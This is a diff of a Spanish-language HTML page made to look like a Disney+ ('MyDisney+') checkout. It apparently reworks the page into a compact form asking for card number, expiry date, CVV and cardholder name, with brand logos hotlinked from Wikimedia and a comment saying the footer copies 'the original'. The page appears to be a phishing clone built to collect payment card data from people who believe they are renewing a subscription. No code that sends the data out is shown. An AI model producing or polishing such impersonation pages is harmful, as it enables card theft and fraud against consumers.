@@ -3,98 +3,68 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Paso 3 | Disney+</title>
+<title>Pagar suscripción | MyDisney+</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
 body {
     margin: 0;
-    background: #0f0f0f;
+    background: #000;
     font-family: 'Inter', sans-serif;
     color: #fff;
 }
 
-/* HEADER */
-header {
-    padding: 20px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+/* CONTENEDOR PRINCIPAL */
+.container {
+    max-width: 430px;
+    margin: 0 auto;
+    background: #111;
+    padding: 30px 25px;
+    margin-top: 35px;
+    border-radius: 20px;
+    border: 1px solid #1f1f1f;
 }
 
-header img {
-    height: 34px;
+/* TÍTULO */
+h1 {
+    font-size: 24px;
+    margin-bottom: 4px;
+    font-weight: 600;
 }
 
-header a {
+.sub {
     color: #bbb;
     font-size: 15px;
-    text-decoration: none;
-}
-
-/* CONTENEDOR PRINCIPAL */
-.main-container {
-    padding: 20px;
-    max-width: 600px;
-    margin: auto;
-}
-
-.step {
-    font-size: 14px;
-    color: #9ca3af;
-}
-
-h1 {
-    font-size: 28px;
-    margin-top: 5px;
     margin-bottom: 25px;
-}
-
-/* TABS DE MÉTODO DE PAGO */
-.tabs {
-    display: flex;
-    margin-bottom: 20px;
-    border-bottom: 1px solid #333;
-}
-
-.tab {
-    flex: 1;
-    text-align: center;
-    padding: 12px 0;
-    font-size: 16px;
-    cursor: pointer;
-    color: #bbb;
-}
-
-.tab.active {
-    color: #00c8ff;
-    border-bottom: 2px solid #00c8ff;
 }
 
 /* LABELS */
 label {
+    font-size: 13px;
     display: block;
-    margin: 18px 0 6px;
-    font-size: 14px;
-    color: #d1d5db;
+    margin-bottom: 6px;
+    color: #ddd;
 }
 
-/* INPUTS */
-input, select {
+/* INPUTS GENERALES */
+input {
     width: 100%;
     padding: 15px;
     background: #1a1a1a;
-    border: 1px solid #383838;
+    border: 1px solid #333;
     border-radius: 6px;
-    color: #fff;
     font-size: 15px;
-    box-sizing: border-box;
+    color: #fff;
 }
 
-/* INPUT ESPECIAL PARA TARJETA */
+/* INPUT TARJETA CON ICONOS */
 .input-card {
     position: relative;
+}
+
+.input-card input {
+    padding-right: 120px;
 }
 
 .card-icons {
@@ -111,88 +81,62 @@ input, select {
     opacity: .9;
 }
 
-/* FILA FECHA / CVV */
+/* FECHA + CVV LADO A LADO */
 .row-double {
     display: flex;
     gap: 15px;
-    margin-top: 5px;
+    margin-top: 15px;
 }
 
 .field-group {
     flex: 1;
-    min-width: 0;
 }
 
-/* BOTÓN FINAL */
+/* BOTÓN PAGAR */
 button {
     width: 100%;
-    padding: 16px;
-    margin-top: 25px;
-    background: #fff;
+    padding: 17px;
+    background: #00C8FF;
     border: none;
-    color: #000;
+    font-size: 16px;
     border-radius: 30px;
-    font-size: 17px;
-    cursor: pointer;
+    margin-top: 25px;
     font-weight: 600;
+    color: #000;
+    cursor: pointer;
+}
+
+button:hover {
+    opacity: .85;
 }
 
 /* FOOTER */
 footer {
-    margin-top: 50px;
-    padding: 35px 20px;
-    background: #0d0d0d;
-    color: #7e7e7e;
+    margin-top: 45px;
     text-align: center;
-    font-size: 13px;
+    padding-bottom: 40px;
 }
 
-footer .footer-top {
-    margin-bottom: 15px;
-}
-
-footer a {
-    color: #00c8ff;
-    text-decoration: none;
-    font-size: 13px;
-}
-
-/* RESPONSIVE: si la pantalla es muy angosta, se ponen uno debajo del otro */
-@media (max-width: 480px) {
-    .row-double {
-        flex-direction: column;
-        gap: 0;
-    }
+footer img {
+    height: 32px;
+    opacity: .6;
+    margin: 6px;
 }
 </style>
 </head>
 
 <body>
 
-<!-- HEADER -->
-<header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
-    <a href="#">Cerrar sesión</a>
-</header>
+<!-- CONTENEDOR DEL FORMULARIO -->
+<div class="container">
 
-<!-- CONTENIDO PRINCIPAL -->
-<div class="main-container">
+    <h1>Agregar método de pago</h1>
+    <p class="sub">Tu suscripción se renovará automáticamente.</p>
 
-    <div class="step">PASO 3 DE 3</div>
-    <h1>¡A disfrutar!</h1>
-
-    <!-- TAB SOLO TARJETA -->
-    <div class="tabs">
-        <div class="tab active">Crédito/Débito</div>
-    </div>
-
-    <!-- FORMULARIO -->
-    <label>NOMBRE EN LA TARJETA</label>
-    <input type="text" placeholder="Nombre del titular">
-
+    <!-- NUMERO DE TARJETA -->
     <label>NÚMERO DE LA TARJETA</label>
     <div class="input-card">
-        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
+        <input type="text" placeholder="•••• •••• •••• ••••">
         <div class="card-icons">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
@@ -200,7 +144,9 @@ footer a {
         </div>
     </div>
 
+    <!-- FECHA Y CVV LADO A LADO -->
     <div class="row-double">
+
         <div class="field-group">
             <label>FECHA DE VENCIMIENTO</label>
             <input type="text" placeholder="MM/AA" maxlength="5">
@@ -210,35 +156,29 @@ footer a {
             <label>CÓDIGO DE SEGURIDAD</label>
             <input type="text" placeholder="CVV" maxlength="4">
         </div>
+
     </div>
 
-    <label>CIUDAD</label>
-    <input type="text" placeholder="Ingrese su ciudad">
+    <!-- NOMBRE -->
+    <div style="margin-top:15px;">
+        <label>NOMBRE DEL TITULAR</label>
+        <input type="text" placeholder="Como aparece en la tarjeta">
+    </div>
 
-    <label>DEPARTAMENTO</label>
-    <select>
-        <option>Seleccionar…</option>
-        <option>Antioquia</option>
-        <option>Cundinamarca</option>
-        <option>Valle del Cauca</option>
-        <option>Atlántico</option>
-        <option>Santander</option>
-    </select>
+    <!-- BOTÓN -->
+    <button>Agregar tarjeta</button>
 
-    <label>RUT (OPCIONAL)</label>
-    <input type="text" placeholder="Opcional">
-
-    <button>INICIAR SUSCRIPCIÓN</button>
 </div>
 
-<!-- FOOTER -->
+<!-- FOOTER CON LOGOS COMO EL ORIGINAL -->
 <footer>
-    <div class="footer-top">
-        © 2025 Disney+. Todos los derechos reservados.
-    </div>
-    <a href="#">Términos de uso</a> · 
-    <a href="#">Política de privacidad</a> · 
-    <a href="#">Ayuda</a>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney_wordmark.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/80/ABC_Network_logo.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/ESPN_wordmark.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/MarvelLogo.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Star_Wars_Logo.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/National-Geographic-Logo.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/Hulu_Logo.svg">
 </footer>
 
 </body>
